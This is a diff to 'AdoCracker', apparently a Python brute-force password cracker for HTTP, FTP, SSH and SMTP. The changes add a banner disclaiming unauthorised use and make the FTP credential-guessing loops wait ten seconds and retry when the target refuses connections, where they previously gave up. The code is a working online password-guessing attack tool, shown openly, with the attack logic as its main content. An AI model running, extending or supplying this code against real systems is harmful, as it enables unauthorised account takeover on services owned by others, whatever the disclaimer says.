@@ -10,8 +10,9 @@ import ftplib
 
 banner = "AdoCracker"
 print(figlet_format(banner, font="standard"))
-print("This is a password cracker tool for HTTP, FTP, SSH and SMTP")
-print("Author @adomigold,", "Github account: https://github.com/adomigold/ \n")
+print("[*] This is a password cracker tool for HTTP, FTP, SSH and SMTP")
+print("[*] This tool is for educational purpose \n[*] Do not use it on systems you are not authorized to")
+print("[*] Author @adomigold,", "Github account: https://github.com/adomigold/ \n")
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-a', '--attack', type=str, help="Target url or IP adress")
@@ -353,11 +354,19 @@ elif args.service == "ftp":
                         except ftplib.error_perm:
                             print('\033[1;37m''[+]', user, '_', password)
                             pass
+                        except ConnectionRefusedError:
+                            print(
+                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
+                                f"seconds... "
+                                f"Press CTRL+c to cancel")
+                            time.sleep(10)
                         else:
                             print("\n\033[1;92m-----------------------------------------"
                                   "\n Username found:", user,
                                   "\n------------------------------------------")
                             exit(0)
+
+
                 connect_ftp(target, port, user, password)
 
         # When colon_file is provided
@@ -381,13 +390,18 @@ elif args.service == "ftp":
                                 print('\033[1;37m''[+]', user, '_', pwd)
                                 pass
                             except ConnectionRefusedError:
-                                print(f"[!] Host: {target} is unreachable")
-                                exit(0)
+                                print(
+                                    f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
+                                    f"seconds... "
+                                    f"Press CTRL+c to cancel")
+                                time.sleep(10)
                             else:
                                 print("\n\033[1;92m-----------------------------------------"
                                       "\n Username and Password found:", user, pwd,
                                       "\n------------------------------------------")
                                 exit(0)
+
+
                     connect_ftp(target, port, user, pwd)
 
     except KeyboardInterrupt:
